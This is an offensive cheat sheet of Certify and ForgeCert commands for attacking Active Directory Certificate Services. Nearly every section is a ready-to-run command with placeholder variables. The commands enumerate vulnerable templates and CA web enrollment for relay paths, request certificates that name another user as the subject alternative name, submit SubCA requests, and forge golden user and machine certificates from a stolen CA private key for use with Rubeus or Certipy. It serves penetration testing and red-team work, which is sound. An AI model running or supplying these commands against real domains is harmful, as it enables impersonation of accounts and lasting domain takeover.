# Certify / ForgeCert

## Certify - enumerate

### Find vulnerable templates

Find vulnerable templates with Certify / ForgeCert.

Enumerate AD CS templates and highlight vulnerable configurations.

```powershell title:"Certify / ForgeCert Find Vulnerable Templates"
.\Certify.exe find /vulnerable /enabled
```
<!-- cheat -->

### Find templates and ACLs

Find templates and ACLs with Certify / ForgeCert.

Enumerate templates, CAs, enrollment permissions, and relevant ACLs.

```powershell title:"Certify / ForgeCert Find Templates and ACLs"
.\Certify.exe find
```
<!-- cheat -->

### Enumerate CAs

Enumerate CAs with Certify / ForgeCert.

List enterprise CAs and web enrollment endpoints.

```powershell title:"Certify / ForgeCert Enumerate CAs"
.\Certify.exe cas
```
<!-- cheat -->

### Enumerate web enrollment

Enumerate web enrollment with Certify / ForgeCert.

Check CA web enrollment exposure for ESC8-style relay paths.

```powershell title:"Certify / ForgeCert Enumerate Web Enrollment"
.\Certify.exe cas /enrolleeSuppliesSubject
```
<!-- cheat -->

## Certify - request

### Request cert with SAN

Run request cert with SAN with Certify / ForgeCert.

Request a certificate from a template that allows enrollee-supplied subject alternative names.

```powershell title:"Certify / ForgeCert Run Request Cert with SAN"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
```
<!-- cheat
var domain
var ca_name
var template_name
var target_user
-->

### Request User cert

Read request user cert with Certify / ForgeCert.

Request a normal User template certificate for the current context.

```powershell title:"Certify / ForgeCert Read Request User Cert"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
```
<!-- cheat
var domain
var ca_name
-->

### Request SubCA cert

Read request SubCA cert with Certify / ForgeCert.

Submit a SubCA request. This often pends; pair with ManageCA/ManageCertificates rights to approve and retrieve it.

```powershell title:"Certify / ForgeCert Read Request SubCA Cert"
.\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:SubCA /altname:"$target_user"
```
<!-- cheat
var ca_fqdn
var ca_name
var target_user
-->

### Download issued request

Download issued request with Certify / ForgeCert.

Download a certificate by request ID after approval.

```powershell title:"Certify / ForgeCert Download Issued Request"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
var ca_fqdn
var ca_name
var request_id
-->

## ForgeCert

### Forge golden certificate

Read forge golden certificate with Certify / ForgeCert.

Forge a certificate signed by a stolen CA private key. Use the resulting PFX with PKINIT tooling such as Rubeus or Certipy.

```powershell title:"Certify / ForgeCert Read Forge Golden Certificate"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "$target_upn" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var target_user
var target_upn
var new_pfx
var new_pfx_pass
-->

### Forge machine certificate

Read forge machine certificate with Certify / ForgeCert.

Forge a certificate for a machine principal.

```powershell title:"Certify / ForgeCert Read Forge Machine Certificate"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$computer_name" --SubjectAltName "$computer_name@$domain" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var computer_name
var domain
var new_pfx
var new_pfx_pass
-->
